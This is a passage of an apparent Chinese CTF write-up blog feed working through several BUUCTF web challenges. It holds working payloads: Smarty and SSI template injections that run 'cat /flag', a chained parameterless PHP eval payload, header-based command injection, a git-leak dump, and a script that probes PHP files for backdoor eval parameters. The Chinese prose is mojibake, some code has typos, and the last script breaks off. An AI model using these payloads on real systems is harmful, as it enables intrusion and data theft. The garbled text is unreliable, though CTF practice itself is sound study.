å°±å¯ä»¥äº†ï¼ŒPHPä»£ç å¯ä»¥è¢«æ‰§è¡Œã€‚</p><p>payloadæœ‰å¾ˆå¤šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;readfile(&#x27;/flag&#x27;)&#125;</span><br><span class="line">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure><h1 id="0x3A-BJDCTF2020-EasySearch"><a href="#0x3A-BJDCTF2020-EasySearch" class="headerlink" title="0x3A.[BJDCTF2020]EasySearch"></a>0x3A.[BJDCTF2020]EasySearch</h1><blockquote><p>  SSI(Server Side Includes)æ³¨å…¥æ¼æ´</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>): </span><br><span class="line">    a = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest() </span><br><span class="line">    f a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>: </span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>å‘è¿‡å»ä¹‹åï¼špublic/dc64a1535c94b7babc55ab528fea462c46e94e90.shtml</p><p>ç„¶åå›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello,6d0bc1</span><br><span class="line"></span><br><span class="line">data: Tuesday, 05-Oct-2021 10:58:18 UTC</span><br><span class="line"></span><br><span class="line">Client IP: 117.152.88.50</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æ˜¯xffï¼Œä½†æ˜¯æ²¡ç”¨ï¼Œçœ‹wpè¯´æ˜¯ã€ŠApache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‹</p><p>åœ¨usernameå†™<code>&lt;!--#exec cmd=&quot;ls&quot;--&gt;</code>ï¼Œç„¶ååœ¨responseç»™çš„é“¾æ¥æ‰“å¼€ã€‚</p><p>æ…¢æ…¢æ‰¾å°±æ‰¾åˆ°flagäº†ã€‚</p><h1 id="0x3B-BSidesCF-2019-Futurella"><a href="#0x3B-BSidesCF-2019-Futurella" class="headerlink" title="0x3B.[BSidesCF 2019]Futurella"></a>0x3B.[BSidesCF 2019]Futurella</h1><p>â€¦.ä¹Ÿä¸çŸ¥é“æƒ³è€ƒå•¥ï¼Œè¿›å»å°±æœ‰flag</p><h1 id="0x3C-GYCTF2020-FlaskApp"><a href="#0x3C-GYCTF2020-FlaskApp" class="headerlink" title="0x3C.[GYCTF2020]FlaskApp"></a>0x3C.[GYCTF2020]FlaskApp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;0x30-WUSTCTF2020-æœ´å®æ— å-å®¡è®¡&quot;&gt;&lt;a href=&quot;#0x30-WUSTCTF2020-æœ´å®æ— å-å®¡è®¡&quot; class=&quot;headerlink&quot; title=&quot;0x30.[WUSTCTF2020]æœ´å®æ— å(å®¡è®¡)&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>BUU_WEBåˆ·é¢˜_0x20-0x2F</title>
    <link href="http://example.com/2021/09/12/BUU-WEB-0x20-0x2F/"/>
    <id>http://example.com/2021/09/12/BUU-WEB-0x20-0x2F/</id>
    <published>2021-09-11T16:00:00.000Z</published>
    <updated>2021-09-15T23:36:25.325Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="0x20-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#0x20-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0x20.[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>0x20.[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><blockquote><p>   è€ƒç‚¹æ˜¯æ— å‚æ•°RCEå…ˆè´´ä¸¤ä¸ªé“¾æ¥ï¼š</p><p>  <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a></p><p>  <a href="http://www.heetian.com/info/827">http://www.heetian.com/info/827</a></p></blockquote><p>æ‰¾äº†åŠå¤©æ²¡å‘ç°å•¥ï¼Œçœ‹wpè¯´æ˜¯gitæ³„éœ²ï¼Œç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack]</span><br><span class="line">â””â”€$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">error: Not a Git index file</span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack]</span><br><span class="line">â””â”€$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.git                                                 1 â¨¯</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">index.php</span><br><span class="line">[OK] index.php</span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack]</span><br><span class="line">â””â”€$ python GitHack.py  http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/.gitls</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">error: Not a Git index file</span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack]</span><br><span class="line">â””â”€$ ls                                                                                                                                    1 â¨¯</span><br><span class="line">25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81  GitHack.py  index  lib  README.md</span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack]</span><br><span class="line">â””â”€$ cd 25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81 </span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81]</span><br><span class="line">â””â”€$ ls</span><br><span class="line">index.php</span><br><span class="line">                                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/GitHack/25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn_81]</span><br><span class="line">â””â”€$ cat index.php                                            </span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span></span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¸€äº›phpçš„ä¼ªåè®®ä¸èƒ½å¤Ÿä½¿ç”¨ï¼Œç¬¬äºŒå±‚(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ï¼Œç¬¬ä¸‰å±‚è¿‡æ»¤äº†ä¸€äº›å‡½æ•°</p><p>è¯´ä¸‹ç¬¬äºŒå±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°ä½¿ç”¨å‚æ•°å°±æ— æ³•é€šè¿‡æ­£åˆ™ï¼Œ(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼,æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰;.ä¸¾ä¸ªä¾‹å­ï¼ša(b(c()));å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯a(â€˜bâ€™)æˆ–è€…a(â€˜bâ€™,â€™câ€™)è¿™ç§å«æœ‰å‚æ•°çš„éƒ½ä¸èƒ½ä½¿ç”¨,æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œ.</p><p>æ„é€ <code>exp=print_r(phpversion());</code>å‘ç°å¯ä»¥æ‰§è¡Œ</p><p>é¦–å…ˆè¦çŸ¥é“éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶ï¼Œä½¿ç”¨print_r(scandir(â€˜.â€™));ï¼Œä¼šå‡ºé—®é¢˜ï¼Œå› ä¸ºæœ‰å‚æ•°.</p><p>ä¸‹é¢å°±è¦æ‰¾ä¸€ä¸ªæ¥ä»£æ›¿scandir(â€˜.â€™)ï¼Œ</p><p>è¦ç”¨åˆ°çš„å‡½æ•°ï¼š</p><ol><li> localeconv():localeconv()è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„â€.â€</li><li> current():current()è¿”å›æ•°ç»„ä¸­çš„å•å…ƒ,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼,åœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨localeconv(current())ä¾¿å¯ä»¥æ„é€ å‡ºæˆ‘ä»¬ä¸€ç›´å¿µå¿µä¸å¿˜çš„â€.â€</li><li> array_reverse():å°†è¾“å…¥çš„æ•°ç»„åå‘æ’åºè¾“å‡º,åœ¨æœ¬é¢˜ä¸­å°†index.phpä½œä¸ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ,flag.phpä½œä¸ºæ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ .</li><li> next():å°†å½“å‰æ•°ç»„çš„å…‰æ ‡å‘åç§»ä¸€ä½,åœ¨æœ¬é¢˜ä¸­å³å°†å…‰æ ‡ä»index.phpè½¬å‘åé¢ä¸€é¡¹çš„flag.php</li></ol><p>å¯ä»¥æ„é€ payloadï¼š<code>exp=print_r(scandir(current(localeconv())));</code></p><p><img src="/2021/09/12/BUU-WEB-0x20-0x2F/image-20210912111645049.png" alt="image-20210912111645049"></p><p>ç„¶åç»§ç»­æ„é€ ï¼š<code>exp=print_r(next(array_reverse(scandir(current(localeconv())))));</code></p><p>å‘ç°å·²ç»æ˜¯flag.phpäº†ç„¶åå¯ä»¥ç”¨ä»¥ä¸‹ä»»æ„å‡½æ•°æ¥åŒ…å«ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">how_source(end(scandir(getcwd())));</span><br><span class="line">readfile</span><br><span class="line">highlight_file</span><br><span class="line">file_get_contents </span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadï¼š<code>exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p><h1 id="0x21-BJDCTF2020-The-mystery-of-ip"><a href="#0x21-BJDCTF2020-The-mystery-of-ip" class="headerlink" title="0x21.[BJDCTF2020]The mystery of ip"></a>0x21.[BJDCTF2020]The mystery of ip</h1><blockquote><p>  è€ƒç‚¹æ˜¯SSTIæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œè´´ä¸ªå›¾ï¼š</p><p>  <img src="/2021/09/12/BUU-WEB-0x20-0x2F/image-20210912114416606.png" alt="image-20210912114416606"></p></blockquote><p>è¿™é¢˜ç¯å¢ƒå¼€çš„æ—¶å€™ä»¥ä¸ºç¯å¢ƒå‡ºé—®é¢˜äº†ï¼ŒåŠ äº†index.phpåå‘ç°æ²¡é—®é¢˜</p><p>çœ‹äº†çœ‹æ²¡å•¥å¤´ç»ªï¼Œç„¶åwpï¼š</p><p>å’Œipæœ‰å…³ï¼Œå°è¯•xffæˆ–è€…client-ipï¼Œ123æˆ–è€…{7*8}ï¼Œéƒ½å¯ä»¥æ§åˆ¶</p><p>ç„¶å``{system(â€œcd ../../../;lsâ€)}`å‘ç°flag</p><p>{system(â€œcd ../../../;cat flagâ€)}</p><h1 id="0x22-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#0x22-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="0x22.[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>0x22.[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h1><p>è§£å‹ä¸‹æ¥3kå¤šä¸ªæ–‡ä»¶ã€‚ã€‚</p><p>è€ƒç‚¹å…¶å®å°±æ˜¯ä»£ç çš„ç¼–å†™ï¼Œä¸ä¼šï¼Œæ‰¾çš„ç½‘ä¸Šçš„ä¸€äº›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">session = requests.Session()</span><br><span class="line"> </span><br><span class="line">path = <span class="string">&quot;D://phpStudy//PHPTutorial//WWW//src//&quot;</span>  <span class="comment"># æ–‡ä»¶å¤¹ç›®å½•</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># å¾—åˆ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åç§°</span></span><br><span class="line"> </span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(path + <span class="string">&quot;/&quot;</span> + file);  <span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    iter_f = <span class="built_in">iter</span>(f);  <span class="comment"># åˆ›å»ºè¿­ä»£å™¨</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># éå†æ–‡ä»¶ï¼Œä¸€è¡Œè¡Œéå†ï¼Œè¯»å–æ–‡æœ¬</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span> + line</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ªé¡µé¢å†…æ‰€æœ‰å‚æ•°</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.find(<span class="string">&quot;$_GET[&#x27;&quot;</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.find(<span class="string">&quot;&#x27;]&quot;</span>, <span class="built_in">str</span>.find(<span class="string">&quot;$_GET[&#x27;&quot;</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.find(<span class="string">&quot;$_GET[&#x27;&quot;</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        params[var] = <span class="string">&#x27;echo(&quot;glzjin&quot;);&#x27;</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"> </span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.find(<span class="string">&quot;$_POST[&#x27;&quot;</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.find(<span class="string">&quot;&#x27;]&quot;</span>, <span class="built_in">str</span>.find(<span class="string">&quot;$_POST[&#x27;&quot;</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.find(<span class="string">&quot;$_POST[&#x27;&quot;</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        data[var] = <span class="string">&#x27;echo(&quot;glzjin&quot;);&#x27;</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&#x27;glzjin&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="built_in">print</span>(file + <span class="string">&quot; found!&quot;</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = 